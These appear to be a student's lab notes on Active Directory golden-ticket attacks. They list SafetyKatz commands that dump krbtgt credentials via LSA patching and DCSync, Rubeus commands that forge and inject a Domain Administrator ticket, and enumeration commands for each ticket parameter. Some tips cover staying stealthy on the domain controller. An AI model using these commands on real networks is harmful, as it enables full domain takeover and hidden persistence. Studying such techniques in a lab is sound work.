A golden ticket is basically a ticket encrypted  by the hash of `krbtgt` account.
- It makes this type of TGT ticket always valid.

The `krbtgt` user hash can be used to impersonate any user with any privileges from even a non domain machine.
- We can impersonate any user because a Domain Admin account  can access to any machine as Domain Administrator.

It is a good practice to change the `krbtgt` account password twice as password history is maintained for the account.

>[!NOTE]
>If we have the `krbtgt` secret hash, we can forge any possible valid `TGT`tickets with any content we  want.
>
>Since we can write what we want in the `TGT` then we can get any desired privileges.
>

![[Pasted image 20261123154313.png|622]]

## How we can extract the `krbtgt` secret?

>[!IMPORTANT]
>We need to be Domain Administrators, and so we need to have access on the `Domain Controller`.


To do it we just need to run `mimikatz` on the `domain controller` as `Domain Administrator`:
```powershell
C:\AD\Tools\Safetykatz.exe '"lsadump::lsa /patch"'
```


If we want to extract the `AES` keys of the `kbrtgt` account we need to use `DCSync` feature:
```powershell
C:\AD\Tools\Safetykatz.exe "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```
- This needs no code execution on the target DC.
- `evasive` is for our safetykatz

>[!IMPORTANT]
>It needs Domain Administator privileges (or a user that has replication rights on the domain object).


> [!WARNING]
> BOTH COMMANDS GIVE US `krbtgt` ACCOUNT CREDENTIALS


# Forging a golden ticket from Rubeus

To generate a golden ticket with attributes similar to a normal TGT we could use Rubeus:
```powershell
C:\AD\Tools\Rubeus.exe evasive-golden \aes256:<krbtgt_aes> /sid:<domain_sid> /ldap /user:Administrator /printcmd
```
- `/ldap` is used to retrieve as many information of the doamin as possible, that are needed to create the ticket
- `/user:Administrator` is used to generate a ticket that will be used by `Administrator`, so we impersonate the default `Administrator` account.
- `/printcmd` is used to print a command we need to execute to create the ticket
- `evasive-` is in this lab, rubeus doesn't use it but in our case we have to




This command sens 3 LDAP Queries to the Domain COntroller :
1. to retrieve flags for user specified in /user
2. to retrieve /groups /pgid, /minpassage /maxpassage
3. to retrieve /netbios of the current domain

>[!NOTE]
>If we have already these information we have to specify as many as we can in order to avoid too much noise on the DC.
>
>If the `Administrator` default account doesn't exist we need to use another user.

### More stealth ticket generation
To avoid too much noise we can use this generation command.
```powershell
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /user:Administrator /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:20759 /netbios:dcorp /groups:520,572,513,512 /dc:dcorp-dc.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```
- `id` is the user id retrieved by the `DC` (default 500)
- `pgid` is the primary group id retrieved from the `DC` (default 513)
- `/groups` are the groups the user is member of, retieved by the `DC` (by default 520, 512,513,519,518)
- `pwdlastset` is the PasswordLastSet for the user we choose (retieved from the DC)
- `/minpassage` is the `Minimum password age` in days (retrieved from DC)
- `/logoncount` is the logon count of the user (retrieved from the DC)
- `/uac` is the `UserAccountControl Flags` (retrieved from the DC) 
- `/ptt` injects the current process, so we have on the current shell a valid ticket.

>[!IMPORTANT]
>| Parametro Rubeus | Comando di enumerazione |
|---|---|
| `/domain` | `(Get-Domain).Name` |
| `/sid` | `Get-DomainSID` |
| `/id` | `(Get-DomainUser -Identity Administrator).objectsid` (RID = ultima componente) |
| `/pgid` | `(Get-DomainUser -Identity Administrator).primarygroupid` |
| `/pwdlastset` | `(Get-DomainUser -Identity Administrator).pwdlastset` |
| `/logoncount` | `(Get-DomainUser -Identity Administrator).logoncount` |
| `/netbios` | `(Get-ADDomain).NetBIOSName` ( Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll -Verbose; Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1) |
| `/groups` | `Get-DomainGroup -UserName Administrator \| select objectsid`  |
| `/dc` | `Get-DomainController \| select name` |
| `/uac` | `(Get-DomainUser -Identity Administrator).useraccountcontrol` |
| `/minpassage` | `(Get-DomainPolicyData).SystemAccess.MinimumPasswordAge` |


![[Pasted image 20261123153505.png]]

![[Pasted image 20261123153522.png]]

